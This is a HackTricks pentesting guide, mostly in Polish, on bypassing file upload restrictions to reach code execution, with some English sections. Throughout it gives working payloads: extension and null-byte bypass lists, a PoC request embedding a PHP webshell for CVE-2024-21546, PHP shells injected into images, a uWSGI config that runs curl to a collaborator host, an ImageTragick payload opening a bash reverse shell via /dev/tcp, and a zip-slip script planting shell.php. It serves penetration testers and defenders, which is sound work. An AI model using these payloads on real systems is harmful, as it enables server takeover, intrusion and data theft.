# Przesyłanie plików

{{#include ../../banners/hacktricks-training.md}}

## Ogólna metodologia przesyłania plików

Inne przydatne rozszerzenia:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omijanie kontroli rozszerzeń plików

1. Jeśli są stosowane, **sprawdź** **wymienione powyżej rozszerzenia.** Testuj je także używając **wielkich liter**: _pHp, .pHP5, .PhAr ..._
2. _Sprawdź **dodanie poprawnego rozszerzenia przed** rozszerzeniem wykonawczym (użyj też poprzednich rozszerzeń):_
- _file.png.php_
- _file.png.Php5_
3. Spróbuj dodać **znaki specjalne na końcu.** Możesz użyć Burp do **bruteforce** wszystkich znaków **ascii** i **Unicode**. (_Uwaga: możesz też spróbować użyć wcześniej wymienionych **rozszerzeń**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Spróbuj obejść zabezpieczenia **oszukując parser rozszerzeń** po stronie serwera technikami takimi jak **podwajanie** **rozszerzenia** lub **dodawanie śmieciowych** danych (**null bytes**) pomiędzy rozszerzeniami. _Możesz też użyć poprzednich rozszerzeń, aby przygotować lepszy payload._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj **kolejną warstwę rozszerzeń** do poprzedniej kontroli:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Spróbuj umieścić **rozszerzenie wykonawcze przed poprawnym rozszerzeniem** i miej nadzieję, że serwer jest błędnie skonfigurowany. (przydatne do eksploatacji błędnych konfiguracji Apache, gdzie wszystko z rozszerzeniem **.php**, ale **niekoniecznie kończące się na .php**, będzie wykonywane):
- _ex: file.php.png_
7. Użycie **NTFS alternate data stream (ADS)** w **Windows**. W tym przypadku po zabronionym rozszerzeniu i przed dozwolonym zostanie wstawiony dwukropek ":". W rezultacie na serwerze zostanie utworzony **pusty plik z zabronionym rozszerzeniem** (np. "file.asax:.jpg”). Ten plik może być później edytowany innymi technikami, np. przy użyciu jego krótkiej nazwy. Wzorzec "**::$data**” może też być użyty do tworzenia plików niepustych. Dlatego dodanie kropki po tym wzorcu może być przydatne do obejścia dalszych ograniczeń (np. "file.asp::$data.”)
8. Spróbuj złamać limity nazwy pliku. Poprawne rozszerzenie zostaje obcięte, a złośliwe PHP pozostaje. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Niektóre mechanizmy obsługi uploadu obcinają lub normalizują końcowe kropki w zapisywanej nazwie pliku. W UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) w wersjach przed 2.9.1 można obejść walidację rozszerzeń przez:

- Użycie poprawnego MIME obrazu i nagłówka magic (np. PNG `\x89PNG\r\n\x1a\n`).
- Nadanie przesyłanemu plikowi nazwy z rozszerzeniem PHP zakończonym kropką, np. `shell.php.`.
- Serwer usuwa końcową kropkę i zapisuje `shell.php`, który wykona się, jeśli zostanie umieszczony w katalogu udostępnianym przez WWW (domyślnie public storage, np. `/storage/files/`).

Minimalny PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Następnie wywołaj zapisaną ścieżkę (typowe dla Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Zabezpieczenia:
- Zaktualizuj unisharp/laravel-filemanager do ≥ 2.9.1.
- Wymuś rygorystyczne server-side allowlists i ponownie zweryfikuj persisted filename.
- Serwuj uploads z lokalizacji non-executable.

### Obejście Content-Type, magic number, kompresji i zmiany rozmiaru

- Obejdź sprawdzanie **Content-Type**, ustawiając **value** nagłówka **Content-Type** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Obejdź sprawdzanie **magic number** przez dodanie na początku pliku **bytes of a real image** (wprowadzając w błąd polecenie _file_). Lub umieść shell w **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` lub możesz również **wprowadzić payload bezpośrednio** do obrazu:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Jeśli do obrazu dodawana jest **kompresja**, na przykład przy użyciu standardowych bibliotek PHP takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), poprzednie techniki mogą być wtedy nieskuteczne. Możesz jednak użyć **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Strona może również **zmieniać rozmiar** obrazu, używając na przykład funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. Możesz jednak użyć **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Inna technika na stworzenie payloadu, który **przetrwa zmianę rozmiaru obrazu**, używając funkcji PHP-GD `thumbnailImage`. Możesz też użyć **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Inne sztuczki do sprawdzenia

- Znajdź podatność pozwalającą **zmienić nazwę** już przesłanego pliku (w celu zmiany extension).
- Znajdź podatność **Local File Inclusion** aby uruchomić backdoor.
- **Możliwe ujawnienie informacji**:
1. Wgraj **kilka razy** (i w tym **samym czasie**) ten **sam plik** o **tej samej nazwie**
2. Wgraj plik z **nazwą** pliku lub **folderu**, który **już istnieje**
3. Wgrywanie pliku o nazwie ".", ".." lub "..." . Na przykład, w Apache na **Windows**, jeśli aplikacja zapisuje przesłane pliki w "/www/uploads/" katalogu, nazwa pliku "." utworzy plik o nazwie "uploads" w katalogu "/www/".
4. Wgraj plik, którego może być trudno się pozbyć, na przykład **"…:.jpg"** w **NTFS**. (Windows)
5. Wgraj plik w **Windows** z **nieważelnymi znakami** takimi jak `|<>*?”` w jego nazwie. (Windows)
6. Wgraj plik w **Windows** używając zarezerwowanych (zakazanych) nazw takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 oraz LPT9.
- Spróbuj też przesłać **pliki wykonywalne** (.exe) lub **.html** (mniej podejrzane), które **wykona kod** po przypadkowym otwarciu przez ofiarę.

### Specjalne sztuczki z rozszerzeniami

Jeśli próbujesz przesłać pliki na **PHP server**, [sprawdź trik z **.htaccess** aby wykonać kod](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Jeśli próbujesz przesłać pliki na **ASP server**, [sprawdź trik z **.config** aby wykonać kod](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` są jak `.jar` dla Java, ale dla php, i mogą być **używane jak plik php** (wykonywane przez php lub include'owane w skrypcie...).

Rozszerzenie `.inc` bywa czasem używane dla plików php, które są tylko importowane, więc możliwe, że ktoś zezwolił na **wykonywanie tego rozszerzenia**.

## **Jetty RCE**

Jeśli możesz przesłać plik XML na serwer Jetty, możesz uzyskać [RCE ponieważ **nowe \*.xml i \*.war są automatycznie przetwarzane**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Zatem, jak pokazano na poniższym obrazku, wgraj plik XML do `$JETTY_BASE/webapps/` i oczekuj shel'a!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Dla szczegółowego omówienia tej podatności sprawdź oryginalne badanie: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities mogą być wykorzystane na serwerach uWSGI, jeśli ktoś ma możliwość modyfikacji pliku konfiguracyjnego `.ini`. Pliki konfiguracyjne uWSGI korzystają ze specyficznej składni pozwalającej na "magic" zmienne, placeholdery i operatory. W szczególności operator '@', używany jako `@(filename)`, służy do dołączania zawartości pliku. Wśród różnych obsługiwanych schematów w uWSGI, schemat "exec" jest szczególnie potężny — pozwala czytać dane ze standardowego wyjścia procesu. Ta funkcja może być zmanipulowana do złośliwych celów, takich jak Remote Command Execution lub Arbitrary File Write/Read, gdy przetwarzany jest plik `.ini`.

Rozważ następujący przykład złośliwego pliku `uwsgi.ini`, pokazujący różne schematy:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie payload ma miejsce podczas parsowania pliku konfiguracyjnego. Aby konfiguracja została aktywowana i sparsowana, proces uWSGI musi zostać albo zrestartowany (potencjalnie po awarii lub w wyniku ataku Denial of Service) albo plik musi być ustawiony na auto-reload. Funkcja auto-reload, jeśli jest włączona, przeładowuje plik w określonych odstępach po wykryciu zmian.

Kluczowe jest zrozumienie luźnej natury parsowania plików konfiguracyjnych uWSGI. Konkretnie, omawiany payload może być wstawiony do pliku binarnego (takiego jak obraz lub PDF), co dodatkowo rozszerza zakres potencjalnego wykorzystania.

## **wget Przesyłanie plików/SSRF sztuczka**

W niektórych przypadkach możesz stwierdzić, że serwer używa **`wget`** do **pobierania plików** i możesz **wskazać** **URL**. W takich sytuacjach kod może sprawdzać, czy rozszerzenie pobieranych plików znajduje się na białej liście, aby upewnić się, że będą pobierane tylko dozwolone pliki. Jednakże, **tego sprawdzenia można obejść.**\
Maksymalna długość **nazwa pliku** w **linux** to **255**, jednak **wget** obcina nazwy plików do **236** znaków. Możesz **pobrać plik o nazwie "A"\*232+".php"+".gif"**, ta nazwa pliku **obejdzie** **sprawdzenie** (ponieważ w tym przykładzie **".gif"** jest **dopuszczalnym** rozszerzeniem), ale `wget` **zmieni nazwę** pliku na **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Note that **another option** you may be thinking of to bypass this check is to make the **HTTP server redirect to a different file**, so the initial URL will bypass the check by then wget will download the redirected file with the new name. This **won't work** **unless** wget is being used with the **parameter** `--trust-server-names` because **wget will download the redirected page with the name of the file indicated in the original URL**.

## Narzędzia

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Corrupting upload indices with snprintf quirks (historical)

Some legacy upload handlers that use `snprintf()` or similar to build multi-file arrays from a single-file upload can be tricked into forging the `_FILES` structure. Due to inconsistencies and truncation in `snprintf()` behavior, a carefully crafted single upload can appear as multiple indexed files on the server side, confusing logic that assumes a strict shape (e.g., treating it as a multi-file upload and taking unsafe branches). While niche today, this “index corruption” pattern occasionally resurfaces in CTFs and older codebases.

## From File upload to other vulnerabilities

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Try **different svg payloads** from [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- If you can **indicate the web server to catch an image from a URL** you could try to abuse a [SSRF](../ssrf-server-side-request-forgery/index.html). If this **image** is going to be **saved** in some **public** site, you could also indicate a URL from [https://iplogger.org/invisible/](https://iplogger.org/invisible/) and **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specially crafted PDFs to XSS: The [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Check if there is any **size limit** uploading files

Here’s a top 10 list of things that you can achieve by uploading (from [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Refer to [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) for other filetypes.

## Zip/Tar File Automatically decompressed Upload

If you can upload a ZIP that is going to be decompressed inside the server, you can do 2 things:

### Symlink

Upload a link containing soft links to other files, then, accessing the decompressed files you will access the linked files:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Rozpakowywanie do różnych folderów

Niespodziewane tworzenie plików w katalogach podczas dekompresji stanowi poważny problem. Pomimo początkowych założeń, że taka konfiguracja może chronić przed OS-level command execution poprzez złośliwe file uploads, hierarchical compression support i możliwości directory traversal formatu archiwum ZIP mogą zostać wykorzystane. Pozwala to atakującym obejść ograniczenia i uciec z secure upload directories, manipulując funkcją dekompresji aplikacji docelowej.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Narzędzie można użyć w następujący sposób:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatkowo, **symlink trick with evilarc** jest opcją. Jeśli celem jest zaatakowanie pliku takiego jak `/flag.txt`, należy utworzyć symlink do tego pliku w swoim systemie. To zapewnia, że evilarc nie napotka błędów podczas działania.

Poniżej znajduje się przykład kodu Python używanego do utworzenia złośliwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Nadużywanie kompresji do file sprayingu**

Szczegóły: **zobacz oryginalny wpis na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Kod PHP jest napisany tak, aby wykonywać polecenia przekazane przez zmienną `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Tworzy się wiele plików, a następnie składany jest plik zip zawierający te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Nazwy plików wewnątrz zipa są zmieniane za pomocą vi lub edytora heksadecymalnego, zamieniając "xxA" na "../" w celu przejścia do katalogów wyżej.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

Prześlij tę zawartość z rozszerzeniem obrazu, aby wykorzystać podatność **(ImageMagick , 7.0.1-1)** (z [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Osadzanie PHP Shell w PNG

Osadzenie PHP shell w sekcji IDAT pliku PNG może skutecznie ominąć niektóre operacje przetwarzania obrazów. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD są szczególnie istotne w tym kontekście, ponieważ są powszechnie używane do zmiany rozmiaru i resamplingu obrazów. Zdolność osadzonego PHP shell do pozostania nienaruszonym przez te operacje stanowi znaczącą zaletę w pewnych przypadkach użycia.

Szczegółowe omówienie tej techniki, wraz z metodologią i potencjalnymi zastosowaniami, znajduje się w następującym artykule: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ten materiał zapewnia kompleksowe zrozumienie procesu i jego implikacji.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Pliki polyglot

Pliki polyglot pełnią unikalną rolę w cyberbezpieczeństwie, działając jak kameleony, które mogą poprawnie istnieć w wielu formatach plików jednocześnie. Interesującym przykładem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda działająca zarówno jako GIF, jak i archiwum RAR. Takie pliki nie ograniczają się do tej pary; możliwe są także kombinacje typu GIF i JS lub PPT i JS.

Główną przydatnością plików polyglot jest ich zdolność do obchodzenia zabezpieczeń, które filtrują pliki na podstawie typu. Powszechną praktyką w różnych aplikacjach jest zezwalanie jedynie na określone typy plików do uploadu — jak JPEG, GIF czy DOC — aby zmniejszyć ryzyko związane z potencjalnie niebezpiecznymi formatami (np. JS, PHP czy Phar). Jednak polyglot, spełniając strukturalne kryteria kilku formatów jednocześnie, może podstępnie ominąć te ograniczenia.

Pomimo swojej elastyczności, polygloty napotykają ograniczenia. Na przykład, choć polyglot może jednocześnie pełnić funkcję pliku PHAR (PHp ARchive) i JPEG, powodzenie jego uploadu może zależeć od polityki platformy dotyczącej rozszerzeń plików. Jeśli system jest rygorystyczny w kwestii dozwolonych rozszerzeń, sama strukturalna dwoistość polyglota może nie wystarczyć, by zapewnić jego przesłanie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Wgrywanie poprawnych JSON-ów tak, jakby to był PDF

Jak uniknąć wykrywania typu pliku przez wgranie poprawnego pliku JSON, nawet gdy nie jest to dozwolone, podszywając się pod plik PDF (techniki z **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dopóki bajty magiczne `%PDF` znajdują się w pierwszych 1024 bajtach, plik jest uznawany za ważny (zobacz przykład w poście)
- **`pdflib` library**: Dodaj fałszywy format PDF wewnątrz pola JSON, aby biblioteka uznała go za PDF (zobacz przykład w poście)
- **`file` binary**: Program może odczytać do 1048576 bajtów z pliku. Wystarczy stworzyć JSON większy niż ta wartość, tak by nie mógł sparsować zawartości jako JSON, a następnie w środku JSON umieścić początkową część prawdziwego PDF — narzędzie uzna go wtedy za PDF

## Źródła

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

{{#include ../../banners/hacktricks-training.md}}
